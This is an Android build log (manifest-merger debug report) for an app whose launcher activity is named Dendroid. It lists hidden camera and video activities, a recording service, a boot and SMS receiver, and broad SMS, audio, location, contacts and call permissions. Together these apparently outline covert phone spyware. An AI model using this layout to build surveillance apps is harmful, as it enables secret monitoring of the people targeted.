app/build/outputs/logs/manifest-merger-debug-report.txt
-- Merging decision tree log ---
manifest
ADDED from src\main\AndroidManifest.xml:1:1-88:12
INJECTED from src\main\AndroidManifest.xml:1:1-88:12
INJECTED from src\main\AndroidManifest.xml:1:1-88:12
INJECTED from src\main\AndroidManifest.xml:1:1-88:12
INJECTED from src\main\AndroidManifest.xml:1:1-88:12
INJECTED from src\main\AndroidManifest.xml:1:1-88:12
INJECTED from src\main\AndroidManifest.xml:1:1-88:12
	package
		ADDED from src\main\AndroidManifest.xml:2:5-32
		INJECTED from src\main\AndroidManifest.xml
		INJECTED from src\main\AndroidManifest.xml
	android:versionName
		ADDED from src\main\AndroidManifest.xml:4:5-30
		INJECTED from src\main\AndroidManifest.xml
		INJECTED from src\main\AndroidManifest.xml
	xmlns:android
		ADDED from src\main\AndroidManifest.xml:1:11-69
	android:versionCode
		ADDED from src\main\AndroidManifest.xml:3:5-28
		INJECTED from src\main\AndroidManifest.xml
		INJECTED from src\main\AndroidManifest.xml
uses-sdk
ADDED from src\main\AndroidManifest.xml:6:5-8:40
INJECTED from src\main\AndroidManifest.xml:6:5-8:40
INJECTED from src\main\AndroidManifest.xml:6:5-8:40
INJECTED from src\main\AndroidManifest.xml:6:5-8:40
INJECTED from src\main\AndroidManifest.xml:6:5-8:40
	android:targetSdkVersion
		ADDED from src\main\AndroidManifest.xml:8:9-38
		INJECTED from src\main\AndroidManifest.xml
		INJECTED from src\main\AndroidManifest.xml
	android:minSdkVersion
		ADDED from src\main\AndroidManifest.xml:7:9-35
		INJECTED from src\main\AndroidManifest.xml
		INJECTED from src\main\AndroidManifest.xml
uses-permission#android.permission.RECEIVE_BOOT_COMPLETED
ADDED from src\main\AndroidManifest.xml:9:5-81
	android:name
		ADDED from src\main\AndroidManifest.xml:9:22-78
supports-screens
ADDED from src\main\AndroidManifest.xml:11:2-14:17
	android:largeScreens
		ADDED from src\main\AndroidManifest.xml:12:15-42
	android:xlargeScreens
		ADDED from src\main\AndroidManifest.xml:13:15-43
	android:resizeable
		ADDED from src\main\AndroidManifest.xml:11:20-45
application
ADDED from src\main\AndroidManifest.xml:16:5-61:19
	android:label
		ADDED from src\main\AndroidManifest.xml:18:9-41
	android:icon
		ADDED from src\main\AndroidManifest.xml:17:9-42
	android:theme
		ADDED from src\main\AndroidManifest.xml:19:3-35
activity#com.connect.Dendroid
ADDED from src\main\AndroidManifest.xml:20:9-27:20
	android:excludeFromRecents
		ADDED from src\main\AndroidManifest.xml:22:13-46
	android:name
		ADDED from src\main\AndroidManifest.xml:21:13-48
intent-filter#android.intent.action.MAIN+android.intent.category.LAUNCHER
ADDED from src\main\AndroidManifest.xml:23:17-26:22
action#android.intent.action.MAIN
ADDED from src\main\AndroidManifest.xml:24:17-69
	android:name
		ADDED from src\main\AndroidManifest.xml:24:25-66
category#android.intent.category.LAUNCHER
ADDED from src\main\AndroidManifest.xml:25:18-78
	android:name
		ADDED from src\main\AndroidManifest.xml:25:28-75
activity#com.connect.Dialog
ADDED from src\main\AndroidManifest.xml:28:9-31:20
	android:excludeFromRecents
		ADDED from src\main\AndroidManifest.xml:30:13-46
	android:name
		ADDED from src\main\AndroidManifest.xml:29:13-46
activity#com.connect.CaptureCameraImage
ADDED from src\main\AndroidManifest.xml:32:9-35:20
	android:excludeFromRecents
		ADDED from src\main\AndroidManifest.xml:34:13-46
	android:name
		ADDED from src\main\AndroidManifest.xml:33:13-58
activity#com.connect.CameraView
ADDED from src\main\AndroidManifest.xml:36:9-39:20
	android:excludeFromRecents
		ADDED from src\main\AndroidManifest.xml:38:13-46
	android:name
		ADDED from src\main\AndroidManifest.xml:37:13-50
activity#com.connect.VideoView
ADDED from src\main\AndroidManifest.xml:40:9-43:20
	android:excludeFromRecents
		ADDED from src\main\AndroidManifest.xml:42:13-46
	android:name
		ADDED from src\main\AndroidManifest.xml:41:13-49
service#com.connect.MyService
ADDED from src\main\AndroidManifest.xml:44:9-47:19
	android:enabled
		ADDED from src\main\AndroidManifest.xml:45:13-35
	android:exported
		ADDED from src\main\AndroidManifest.xml:46:13-36
	android:name
		ADDED from src\main\AndroidManifest.xml:44:18-54
service#com.connect.RecordService
ADDED from src\main\AndroidManifest.xml:48:9-49:19
	android:name
		ADDED from src\main\AndroidManifest.xml:48:18-58
receiver#com.connect.ServiceReceiver
ADDED from src\main\AndroidManifest.xml:50:18-60:20
	android:enabled
		ADDED from src\main\AndroidManifest.xml:51:20-42
	android:exported
		ADDED from src\main\AndroidManifest.xml:52:20-43
	android:name
		ADDED from src\main\AndroidManifest.xml:50:28-70
intent-filter#android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE+android.intent.action.BOOT_COMPLETED+android.intent.action.PHONE_STATE+android.intent.action.QUICKBOOT_POWERON+android.provider.Telephony.SMS_RECEIVED
ADDED from src\main\AndroidManifest.xml:53:13-59:29
	android:priority
		ADDED from src\main\AndroidManifest.xml:53:28-51
action#android.intent.action.BOOT_COMPLETED
ADDED from src\main\AndroidManifest.xml:54:9-71
	android:name
		ADDED from src\main\AndroidManifest.xml:54:17-68
action#android.provider.Telephony.SMS_RECEIVED
ADDED from src\main\AndroidManifest.xml:55:21-86
	android:name
		ADDED from src\main\AndroidManifest.xml:55:29-83
action#android.intent.action.PHONE_STATE
ADDED from src\main\AndroidManifest.xml:56:15-74
	android:name
		ADDED from src\main\AndroidManifest.xml:56:23-71
action#android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE
ADDED from src\main\AndroidManifest.xml:57:15-100
	android:name
		ADDED from src\main\AndroidManifest.xml:57:23-98
action#android.intent.action.QUICKBOOT_POWERON
ADDED from src\main\AndroidManifest.xml:58:15-80
	android:name
		ADDED from src\main\AndroidManifest.xml:58:23-77
uses-permission#android.permission.QUICKBOOT_POWERON
ADDED from src\main\AndroidManifest.xml:63:1-97
	android:required
		ADDED from src\main\AndroidManifest.xml:63:70-94
	android:name
		ADDED from src\main\AndroidManifest.xml:63:18-69
uses-permission#android.permission.INTERNET
ADDED from src\main\AndroidManifest.xml:64:1-86
	android:required
		ADDED from src\main\AndroidManifest.xml:64:61-84
	android:name
		ADDED from src\main\AndroidManifest.xml:64:18-60
uses-permission#android.permission.READ_SMS
ADDED from src\main\AndroidManifest.xml:65:1-87
	android:required
		ADDED from src\main\AndroidManifest.xml:65:61-84
	android:name
		ADDED from src\main\AndroidManifest.xml:65:18-60
uses-permission#android.permission.WRITE_SMS
ADDED from src\main\AndroidManifest.xml:66:1-88
	android:required
		ADDED from src\main\AndroidManifest.xml:66:62-85
	android:name
		ADDED from src\main\AndroidManifest.xml:66:18-61
uses-permission#android.permission.GET_ACCOUNTS
ADDED from src\main\AndroidManifest.xml:67:1-91
	android:required
		ADDED from src\main\AndroidManifest.xml:67:65-88
	android:name
		ADDED from src\main\AndroidManifest.xml:67:18-64
uses-permission#com.android.browser.permission.READ_HISTORY_BOOKMARKS
ADDED from src\main\AndroidManifest.xml:68:1-88
	android:name
		ADDED from src\main\AndroidManifest.xml:68:18-86
uses-permission#android.permission.ACCESS_NETWORK_STATE
ADDED from src\main\AndroidManifest.xml:69:1-98
	android:required
		ADDED from src\main\AndroidManifest.xml:69:73-96
	android:name
		ADDED from src\main\AndroidManifest.xml:69:18-72
uses-permission#android.permission.READ_CONTACTS
ADDED from src\main\AndroidManifest.xml:70:1-92
	android:required
		ADDED from src\main\AndroidManifest.xml:70:66-89
	android:name
		ADDED from src\main\AndroidManifest.xml:70:18-65
uses-permission#android.permission.ACCESS_FINE_LOCATION
ADDED from src\main\AndroidManifest.xml:71:1-99
	android:required
		ADDED from src\main\AndroidManifest.xml:71:73-96
	android:name
		ADDED from src\main\AndroidManifest.xml:71:18-72
uses-permission#android.permission.GET_TASKS
ADDED from src\main\AndroidManifest.xml:72:1-88
	android:required
		ADDED from src\main\AndroidManifest.xml:72:62-85
	android:name
		ADDED from src\main\AndroidManifest.xml:72:18-61
uses-permission#android.permission.WAKE_LOCK
ADDED from src\main\AndroidManifest.xml:73:1-89
	android:required
		ADDED from src\main\AndroidManifest.xml:73:62-86
	android:name
		ADDED from src\main\AndroidManifest.xml:73:18-61
uses-permission#android.permission.CALL_PHONE
ADDED from src\main\AndroidManifest.xml:74:1-89
	android:required
		ADDED from src\main\AndroidManifest.xml:74:63-86
	android:name
		ADDED from src\main\AndroidManifest.xml:74:18-62
uses-permission#android.permission.SEND_SMS
ADDED from src\main\AndroidManifest.xml:75:1-87
	android:required
		ADDED from src\main\AndroidManifest.xml:75:61-84
	android:name
		ADDED from src\main\AndroidManifest.xml:75:18-60
uses-permission#android.permission.WRITE_SETTINGS
ADDED from src\main\AndroidManifest.xml:76:1-94
	android:required
		ADDED from src\main\AndroidManifest.xml:76:67-91
	android:name
		ADDED from src\main\AndroidManifest.xml:76:18-66
uses-permission#android.permission.READ_PHONE_STATE
ADDED from src\main\AndroidManifest.xml:77:1-96
	android:required
		ADDED from src\main\AndroidManifest.xml:77:69-93
	android:name
		ADDED from src\main\AndroidManifest.xml:77:18-68
uses-permission#android.permission.WRITE_EXTERNAL_STORAGE
ADDED from src\main\AndroidManifest.xml:78:1-101
	android:required
		ADDED from src\main\AndroidManifest.xml:78:75-98
	android:name
		ADDED from src\main\AndroidManifest.xml:78:18-74
uses-permission#android.permission.CAMERA
ADDED from src\main\AndroidManifest.xml:79:1-85
	android:required
		ADDED from src\main\AndroidManifest.xml:79:59-82
	android:name
		ADDED from src\main\AndroidManifest.xml:79:18-58
uses-permission#android.permission.RECORD_AUDIO
ADDED from src\main\AndroidManifest.xml:80:1-92
	android:required
		ADDED from src\main\AndroidManifest.xml:80:65-89
	android:name
		ADDED from src\main\AndroidManifest.xml:80:18-64
uses-permission#android.permission.PROCESS_OUTGOING_CALLS
ADDED from src\main\AndroidManifest.xml:81:1-101
	android:required
		ADDED from src\main\AndroidManifest.xml:81:75-98
	android:name
		ADDED from src\main\AndroidManifest.xml:81:18-74
uses-permission#android.permission.RECEIVE_SMS
ADDED from src\main\AndroidManifest.xml:82:1-90
	android:required
		ADDED from src\main\AndroidManifest.xml:82:64-87
	android:name
		ADDED from src\main\AndroidManifest.xml:82:18-63
uses-feature#android.hardware.camera
ADDED from src\main\AndroidManifest.xml:83:1-81
	android:required
		ADDED from src\main\AndroidManifest.xml:83:54-78
	android:name
		ADDED from src\main\AndroidManifest.xml:83:15-53
uses-feature#android.hardware.camera.front
ADDED from src\main\AndroidManifest.xml:84:1-87
	android:required
		ADDED from src\main\AndroidManifest.xml:84:60-84
	android:name
		ADDED from src\main\AndroidManifest.xml:84:15-59
uses-feature#android.hardware.camera.autofocus
ADDED from src\main\AndroidManifest.xml:85:1-91
	android:required
		ADDED from src\main\AndroidManifest.xml:85:64-88
	android:name
		ADDED from src\main\AndroidManifest.xml:85:15-63
uses-feature#android.hardware.microphone
ADDED from src\main\AndroidManifest.xml:86:1-85
	android:required
		ADDED from src\main\AndroidManifest.xml:86:58-82
	android:name
		ADDED from src\main\AndroidManifest.xml:86:15-57